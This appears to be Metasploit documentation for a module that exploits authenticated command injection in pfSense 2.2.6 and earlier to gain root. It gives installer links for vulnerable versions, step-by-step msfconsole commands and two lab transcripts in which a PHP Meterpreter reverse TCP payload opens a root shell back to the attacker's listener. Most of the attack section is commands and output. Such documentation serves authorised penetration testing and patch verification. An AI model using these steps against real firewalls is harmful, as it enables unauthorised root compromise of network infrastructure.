## Description

  This module exploits a vulnerability in pfSense version 2.2.6 and before which allows an authenticated user to execute arbitrary operating system commands as root.

## Vulnerable Application

  This module has been tested successfully on version 2.2.6-RELEASE, 2.2.5-RELEASE, and 2.1.3-RELEASE

  Installers:

  * [pfSense 2.2.6-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.6-RELEASE-amd64.iso.gz)
  * [pfSense 2.2.5-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.2.5-RELEASE-amd64.iso.gz)
  * [pfSense 2.1.3-RELEASE](https://nyifiles.pfsense.org/mirror/downloads/old/pfSense-LiveCD-2.1.3-RELEASE-amd64.iso.gz)

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/unix/http/pfsense_graph_injection_exec`
  3. Do: `set RHOST [IP]`
  4. Do: `set USERNAME [username]`
  5. Do: `set PASSWORD [password]`
  6. Do: `set LHOST [IP]`
  7. Do: `exploit`

## Scenarios

### pfSense Community Edition 2.2.6-RELEASE

```
msf exploit(unix/http/pfsense_graph_injection_exec) > options 

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST     192.168.75.132   yes       The target address
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.75.128   yes       The listen address
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 192.168.75.128:80 
[*] Detected pfSense 2.2.6-RELEASE, uploading intial payload
[*] Triggering the payload, root shell incoming...
[*] Sending stage (37543 bytes) to 192.168.75.132
[*] Meterpreter session 1 opened (192.168.75.128:80 -> 192.168.75.132:34381) at 2018-01-01 02:07:03 -0600

meterpreter > getuid
Server username: root (0)
meterpreter > 
```

### pfSense Community Edition 2.1.3-RELEASE

```
msf exploit(unix/http/pfsense_graph_injection_exec) > options 

Module options (exploit/unix/http/pfsense_graph_injection_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  pfsense          yes       Password to login with
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST     192.168.75.131   yes       The target address
   RPORT     443              yes       The target port (TCP)
   SSL       true             no        Negotiate SSL/TLS for outgoing connections
   USERNAME  admin            yes       User to login with
   VHOST                      no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.75.128   yes       The listen address
   LPORT  80               yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf exploit(unix/http/pfsense_graph_injection_exec) > exploit

[*] Started reverse TCP handler on 192.168.75.128:80 
[*] Detected pfSense 2.1.3-RELEASE, uploading intial payload
[*] Triggering the payload, root shell incoming...
[*] Sending stage (37543 bytes) to 192.168.75.131
[*] Meterpreter session 1 opened (192.168.75.128:80 -> 192.168.75.131:45257) at 2018-01-01 01:03:05 -0600

meterpreter > getuid
Server username: root (0)
meterpreter > 
```
